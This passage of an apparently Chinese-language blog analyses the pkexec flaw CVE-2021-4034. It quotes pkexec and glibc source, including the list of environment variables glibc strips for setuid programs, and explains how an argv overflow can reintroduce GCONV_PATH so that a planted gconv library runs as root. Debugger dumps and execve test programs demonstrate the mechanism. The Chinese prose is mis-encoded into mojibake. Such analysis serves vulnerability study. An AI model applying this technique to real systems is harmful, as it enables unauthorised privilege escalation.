class=\"line\">    <span class=\"comment\">/* argc&lt;2 and pkexec runs just shell, argv is guaranteed to be null-terminated.</span></span><br><span class=\"line\"><span class=\"comment\">     * /-less shell shouldn&#x27;t happen, but let&#x27;s be defensive and don&#x27;t write to null-termination</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (argv[n] != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      argv[n] = path;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li><code>g_find_program_in_path (path)</code>  æœç´¢å‘½ä»¤çš„ç»å¯¹è·¯å¾„</li>\n<li>ç»å¯¹è·¯å¾„è¢«å›å†™å› <code>argv[n]</code></li>\n</ul>\n<p>å¯¹äºå‘½ä»¤è¡Œå‚æ•° <code>argv[]</code>  æ˜¯åœ¨ <code>environ[]</code>  ä¹‹åè¿ç€è¢«å‹å…¥çš„<br>\nå‘½ä»¤è¡Œå¯åŠ¨ <code>pkexec</code> ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è‡ªå·± <code>&quot;pkexec&quot;</code> <br>\n ä½†æ˜¯å¦‚æœç”¨ <code>execve</code>  å¯åŠ¨ï¼Œç¬¬ä¸€ä¸ªå°±æ˜¯ <code>NULL</code>  äº†ï¼Œç¬¬äºŒä¸ªå°±æ˜¯ç¯å¢ƒå˜é‡ <code>environ[0]</code></p>\n<h3 id=\"dlåäº‹åšå°½\"><a class=\"markdownIt-Anchor\" href=\"#dlåäº‹åšå°½\">#</a> dl åäº‹åšå°½</h3>\n<p>glibc2.27 ****/elf/dl-support.c : 307</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span></span><br><span class=\"line\">_dl_non_dynamic_init (<span class=\"type\">void</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  Â·Â·Â·Â·Â·Â·Â·Â·</span><br><span class=\"line\">  Â·Â·Â·Â·Â·Â·Â·Â·</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (__libc_enable_secure)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"type\">static</span> <span class=\"type\">const</span> <span class=\"type\">char</span> unsecure_envvars[] =</span><br><span class=\"line\">\tUNSECURE_ENVVARS</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> EXTRA_UNSECURE_ENVVARS</span></span><br><span class=\"line\">\tEXTRA_UNSECURE_ENVVARS</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">\t;</span><br><span class=\"line\">      <span class=\"type\">const</span> <span class=\"type\">char</span> *cp = unsecure_envvars;</span><br><span class=\"line\">      <span class=\"comment\">// æ¸…é™¤ä¸å®‰å…¨çš„ç¯å¢ƒå˜é‡</span></span><br><span class=\"line\">      <span class=\"keyword\">while</span> (cp &lt; unsecure_envvars + <span class=\"built_in\">sizeof</span> (unsecure_envvars))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t  __unsetenv (cp);</span><br><span class=\"line\">\t  cp = (<span class=\"type\">const</span> <span class=\"type\">char</span> *) __rawmemchr (cp, <span class=\"string\">&#x27;\\0&#x27;</span>) + <span class=\"number\">1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> !HAVE_TUNABLES</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (__access (<span class=\"string\">&quot;/etc/suid-debug&quot;</span>, F_OK) != <span class=\"number\">0</span>)</span><br><span class=\"line\">\t__unsetenv (<span class=\"string\">&quot;MALLOC_CHECK_&quot;</span>);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> DL_PLATFORM_INIT</span></span><br><span class=\"line\">  DL_PLATFORM_INIT;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> DL_OSVERSION_INIT</span></span><br><span class=\"line\">  DL_OSVERSION_INIT;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">  <span class=\"comment\">/* Now determine the length of the platform string.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (_dl_platform != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    _dl_platformlen = <span class=\"built_in\">strlen</span> (_dl_platform);</span><br><span class=\"line\">  <span class=\"comment\">/* Scan for a program header telling us the stack is nonexecutable.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (_dl_phdr != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">uint_fast16_t</span> i = <span class=\"number\">0</span>; i &lt; _dl_phnum; ++i)</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (_dl_phdr[i].p_type == PT_GNU_STACK)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t  _dl_stack_flags = _dl_phdr[i].p_flags;</span><br><span class=\"line\">\t  <span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> DL_SYSINFO_IMPLEMENTATION</span></span><br><span class=\"line\">DL_SYSINFO_IMPLEMENTATION</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> ENABLE_STATIC_PIE</span></span><br><span class=\"line\"><span class=\"comment\">/* Since relocation to hidden _dl_main_map causes relocation overflow on</span></span><br><span class=\"line\"><span class=\"comment\">   aarch64, a function is used to get the address of _dl_main_map.  */</span></span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">link_map</span> *</span><br><span class=\"line\">_dl_get_dl_main_map (<span class=\"type\">void</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> &amp;_dl_main_map;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br></pre></td></tr></table></figure>\n<p>è€Œ <code>UNSECURE_ENVVARS</code>  çš„å˜é‡æ˜¯å®šä¹‰åœ¨ glibc-2.27/sysdeps/generic/unsecvars.h : 10</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> !HAVE_TUNABLES</span></span><br><span class=\"line\"><span class=\"meta\"># <span class=\"keyword\">define</span> GLIBC_TUNABLES_ENVVAR <span class=\"string\">&quot;GLIBC_TUNABLES\\0&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">else</span></span></span><br><span class=\"line\"><span class=\"meta\"># <span class=\"keyword\">define</span> GLIBC_TUNABLES_ENVVAR</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"><span class=\"comment\">/* Environment variable to be removed for SUID programs.  The names are</span></span><br><span class=\"line\"><span class=\"comment\">   all stuffed in a single string which means they have to be terminated</span></span><br><span class=\"line\"><span class=\"comment\">   with a &#x27;\\0&#x27; explicitly.  */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> UNSECURE_ENVVARS \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;GCONV_PATH\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;GETCONF_DIR\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  GLIBC_TUNABLES_ENVVAR\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;HOSTALIASES\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_AUDIT\\0&quot;</span>\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_DEBUG\\0&quot;</span>\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_DEBUG_OUTPUT\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_DYNAMIC_WEAK\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_HWCAP_MASK\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_LIBRARY_PATH\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_ORIGIN_PATH\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_PRELOAD\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_PROFILE\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_SHOW_AUXV\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LD_USE_LOAD_BIAS\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LOCALDOMAIN\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;LOCPATH\\0&quot;</span>\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;MALLOC_TRACE\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;NIS_PATH\\0&quot;</span>\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;NLSPATH\\0&quot;</span>\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;RESOLV_HOST_CONF\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;RES_OPTIONS\\0&quot;</span>\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;TMPDIR\\0&quot;</span>\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"string\">&quot;TZDIR\\0&quot;</span></span></span><br></pre></td></tr></table></figure>\n<p>å½“æ£€æµ‹ç¨‹åºæ˜¯ç‰¹æƒæ–‡ä»¶çš„æ—¶å€™ï¼Œä¼šæ¸…ç©ºä¸Šé¢çš„ç¯å¢ƒå˜é‡<br>\næ‰€ä»¥ä¸èƒ½ç›´æ¥å½“ç¯å¢ƒå˜é‡ä¼ å…¥<br>\nä½†è¿™æ¬¡æˆ‘ä»¬æœ‰ä¸€æ¬¡ä»»æ„å†™æœºä¼š<br>\néœ€è¦åŠ«æŒç¯å¢ƒå˜é‡å¼•å…¥æˆ‘ä»¬çš„æ¶æ„åº“</p>\n<h3 id=\"åŠ«æŒç¯å¢ƒå˜é‡\"><a class=\"markdownIt-Anchor\" href=\"#åŠ«æŒç¯å¢ƒå˜é‡\">#</a> åŠ«æŒç¯å¢ƒå˜é‡</h3>\n<p>åˆ©ç”¨çš„ç¯å¢ƒå˜é‡æ˜¯ <code>GCONV_PATH</code> <br>\n<a href=\"https://trganda.github.io/posts/iconv/\">https://trganda.github.io/posts/iconv/</a></p>\n<blockquote>\n<p>In <a href=\"https://www.gnu.org/software/libc/manual/html_node/Generic-Conversion-Interface.html\">glib</a>, a module named iconv support convert a charset to another. And the conversion was implemented in such dynamic library (gconv module) which implement pre-request <a href=\"https://www.gnu.org/software/libc/manual/html_node/glibc-iconv-Implementation.html#6.5.4.4%20iconv%20module%20interfaces\">interface</a>, the usage of these gconv module were defined in a configuration file with name gconv-modules.</p>\n</blockquote>\n<ul>\n<li><code>iconv</code>  è½¬æ¢å­—ç¬¦é›†</li>\n<li><code>iconv</code>  æ˜¯åœ¨ä¸€ä¸ªåŠ¨æ€åº“ <code>gconv module</code></li>\n<li>åŠ¨æ€åº“ <code>gconv module</code>  å®šä¹‰åœ¨é…ç½®æ–‡ä»¶å¤¹ <code>gconv-modules</code>  é‡Œ</li>\n<li>ä¼šè°ƒç”¨è¿™ä¸ªæ–‡ä»¶å¤¹ <code>gconv-modules</code>  ä¸‹çš„ <code>so</code>  æ–‡ä»¶ä¸­çš„ <code>gconv()</code>  å’Œ <code>gconv_init()</code></li>\n</ul>\n<p>The default  <code>gconv module</code>  and  <code>gconv module configuration</code>  file was located in:</p>\n<ul>\n<li>/usr/lib/gconv: Usual default gconv module path.</li>\n<li>/usr/lib/gconv/gconv-modules: Usual system default gconv module configuration file.</li>\n<li>/usr/lib/gconv/gconv-modules.cache: Usual system gconv module configuration cache</li>\n</ul>\n<p>å¯ä»¥çœ‹çœ‹ iconv çš„ help</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">squ@squ-virtual-machine:~/Desktop/cve/CVE-2021-4034/poc$ iconv --help</span><br><span class=\"line\">Usage: iconv [OPTION...] [FILE...]</span><br><span class=\"line\">Convert encoding of given files from one encoding to another.</span><br><span class=\"line\"></span><br><span class=\"line\"> Input/Output format specification:</span><br><span class=\"line\">  -f, --from-code=NAME       encoding of original text</span><br><span class=\"line\">  -t, --to-code=NAME         encoding for output</span><br><span class=\"line\"></span><br><span class=\"line\"> Information:</span><br><span class=\"line\">  -l, --list                 list all known coded character sets</span><br><span class=\"line\"></span><br><span class=\"line\"> Output control:</span><br><span class=\"line\">  -c                         omit invalid characters from output</span><br><span class=\"line\">  -o, --output=FILE          output file</span><br><span class=\"line\">  -s, --silent               suppress warnings</span><br><span class=\"line\">      --verbose              print progress information</span><br><span class=\"line\"></span><br><span class=\"line\">  -?, --help                 Give this help list</span><br><span class=\"line\">      --usage                Give a short usage message</span><br><span class=\"line\">  -V, --version              Print program version</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>ä½¿ç”¨</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">iconv -f UTF-8 -t UTF-16 &lt; input file &gt; output file</span><br></pre></td></tr></table></figure>\n<p><code>iconv</code>  ä¼šè°ƒç”¨ <code>iconv_open()</code>  è€Œ <code>iconv_open()</code>  ä¾èµ–ç¯å¢ƒå˜é‡ <code>GCONV_PATH</code></p>\n<blockquote>\n<p>The iconv support extension the charset conversion ability by user defined gconv module. When use iconv or call iconv() function, it must first allocate a conversion descriptor using <a href=\"https://man7.org/linux/man-pages/man3/iconv_open.3.html\">iconv_open()</a>. The operation of this function will influence by the enviroment GCONV_PATH</p>\n</blockquote>\n<p><em><strong>æ­¤å¤„åº”è¯¥æœ‰æºç ï¼Œä¹‹åè¡¥</strong></em><br>\nç”¨ <code>GCONV_PATH</code>  æŒ‡å®šè‡ªå®šä¹‰æ¨¡å—å»æ›¿æ¢ç³»ç»Ÿæ¨¡å—<br>\næ‰€ä»¥åˆ©ç”¨æ–¹æ³•å¦‚ä¸‹</p>\n<blockquote>\n<p>Suppose we can control the content of enviroment GCONV_PATH, provide a gconv module configuration file and gconv module with evil code. The evil code may be execute for some case.</p>\n</blockquote>\n<p><a href=\"https://www.gnu.org/software/libc/manual/html_node/glibc-iconv-Implementation.html#6.5.4.1%20Format%20of%20gconv-modules%20files\">gconv æ ¼å¼</a></p>\n<h3 id=\"å…³äºargvå’Œenviron\"><a class=\"markdownIt-Anchor\" href=\"#å…³äºargvå’Œenviron\">#</a> å…³äº argv å’Œ environ</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">environ</span></span><br><span class=\"line\">00:0000â”‚ rdx 0x7fffffffe018 â€”â–¸ 0x7fffffffe374 â—‚â€” &#x27;SHELL=/bin/bash&#x27;</span><br><span class=\"line\">01:0008â”‚     0x7fffffffe020 â€”â–¸ 0x7fffffffe384 â—‚â€” &#x27;SESSION_MANAGER=local/squ-virtual-machine:@/tmp/.ICE-unix/1566,unix/squ-virtual-machine:/tmp/.ICE-unix/1566&#x27;</span><br><span class=\"line\">02:0010â”‚     0x7fffffffe028 â€”â–¸ 0x7fffffffe3f0 â—‚â€” &#x27;QT_ACCESSIBILITY=1&#x27;</span><br><span class=\"line\">03:0018â”‚     0x7fffffffe030 â€”â–¸ 0x7fffffffe403 â—‚â€” &#x27;COLORTERM=truecolor&#x27;</span><br><span class=\"line\">04:0020â”‚     0x7fffffffe038 â€”â–¸ 0x7fffffffe417 â—‚â€” &#x27;XDG_CONFIG_DIRS=/etc/xdg/xdg-ubuntu:/etc/xdg&#x27;</span><br><span class=\"line\">05:0028â”‚     0x7fffffffe040 â€”â–¸ 0x7fffffffe444 â—‚â€” &#x27;XDG_MENU_PREFIX=gnome-&#x27;</span><br><span class=\"line\">06:0030â”‚     0x7fffffffe048 â€”â–¸ 0x7fffffffe45b â—‚â€” &#x27;GNOME_DESKTOP_SESSION_ID=this-is-deprecated&#x27;</span><br><span class=\"line\">07:0038â”‚     0x7fffffffe050 â€”â–¸ 0x7fffffffe487 â—‚â€” &#x27;LC_ADDRESS=zh_CN.UTF-8&#x27;</span><br><span class=\"line\">08:0040â”‚     0x7fffffffe058 â€”â–¸ 0x7fffffffe49e â—‚â€” &#x27;GNOME_SHELL_SESSION_MODE=ubuntu&#x27;</span><br><span class=\"line\">09:0048â”‚     0x7fffffffe060 â€”â–¸ 0x7fffffffe4be â—‚â€” &#x27;LC_NAME=zh_CN.UTF-8&#x27;</span><br><span class=\"line\">0a:0050â”‚     0x7fffffffe068 â€”â–¸ 0x7fffffffe4d2 â—‚â€” &#x27;SSH_AUTH_SOCK=/run/user/1000/keyring/ssh&#x27;</span><br><span class=\"line\">0b:0058â”‚     0x7fffffffe070 â€”â–¸ 0x7fffffffe4fb â—‚â€” &#x27;XMODIFIERS=@im=ibus&#x27;</span><br><span class=\"line\">0c:0060â”‚     0x7fffffffe078 â€”â–¸ 0x7fffffffe50f â—‚â€” &#x27;DESKTOP_SESSION=ubuntu&#x27;</span><br><span class=\"line\">0d:0068â”‚     0x7fffffffe080 â€”â–¸ 0x7fffffffe526 â—‚â€” &#x27;LC_MONETARY=zh_CN.UTF-8&#x27;</span><br><span class=\"line\">0e:0070â”‚     0x7fffffffe088 â€”â–¸ 0x7fffffffe53e â—‚â€” &#x27;SSH_AGENT_PID=1528&#x27;</span><br><span class=\"line\">0f:0078â”‚     0x7fffffffe090 â€”â–¸ 0x7fffffffe551 â—‚â€” &#x27;GTK_MODULES=gail:atk-bridge&#x27;</span><br><span class=\"line\">10:0080â”‚     0x7fffffffe098 â€”â–¸ 0x7fffffffe56d â—‚â€” &#x27;PWD=/home/squ/Desktop&#x27;</span><br><span class=\"line\">11:0088â”‚     0x7fffffffe0a0 â€”â–¸ 0x7fffffffe583 â—‚â€” &#x27;XDG_SESSION_DESKTOP=ubuntu&#x27;</span><br><span class=\"line\">-------------------------------------------------------------------------------</span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">argv</span></span><br><span class=\"line\">00:0000â”‚ rsi 0x7fffffffe008 â€”â–¸ 0x7fffffffe35c â—‚â€” &#x27;/home/squ/Desktop/a.out&#x27;</span><br><span class=\"line\">01:0008â”‚     0x7fffffffe010 â—‚â€” 0x0</span><br></pre></td></tr></table></figure>\n<p><code>argv</code>  çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è‡ªå·±çš„ç»å¯¹è·¯å¾„ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ <code>NULL</code></p>\n<h4 id=\"execvec\"><a class=\"markdownIt-Anchor\" href=\"#execvec\">#</a> execve.c</h4>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span>* <span class=\"type\">const</span> argv[] = &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;AAAA1111&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;BBBB2222&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;CCCC3333&quot;</span>,</span><br><span class=\"line\">        <span class=\"literal\">NULL</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"type\">char</span>* <span class=\"type\">const</span> envp[] = &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;DDDD3333&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;EEEE4444&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;FFFF5555&quot;</span>,</span><br><span class=\"line\">        <span class=\"literal\">NULL</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">execve</span>(<span class=\"string\">&quot;./test&quot;</span>, argv, envp);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"testc\"><a class=\"markdownIt-Anchor\" href=\"#testc\">#</a> test.c</h4>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>** argv)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;argc: %d\\n&quot;</span>, argc);</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i; i&lt;<span class=\"number\">8</span>; i++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(argv[i]!=<span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;argv[%d]: %s\\n&quot;</span>, i, argv[i]);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;argv[%d]: NULL\\n&quot;</span>, i);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"ç»“æœ\"><a class=\"markdownIt-Anchor\" href=\"#ç»“æœ\">#</a> ç»“æœ</h4>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">squ@squ-<span class=\"keyword\">virtual</span>-machine:~/Desktop$ ./execve </span><br><span class=\"line\">argc: <span class=\"number\">3</span></span><br><span class=\"line\">argv[<span class=\"number\">0</span>]: AAAA1111</span><br><span class=\"line\">argv[<span class=\"number\">1</span>]: BBBB2222</span><br><span class=\"line\">argv[<span class=\"number\">2</span>]: CCCC3333</span><br><span class=\"line\">argv[<span class=\"number\">3</span>]: <span class=\"literal\">NULL</span></span><br><span class=\"line\">argv[<span class=\"number\">4</span>]: DDDD3333</span><br><span class=\"line\">argv[<span class=\"number\">5</span>]: EEEE4444</span><br><span class=\"line\">argv[<span class=\"number\">6</span>]: FFFF5555</span><br><span class=\"line\">argv[<span 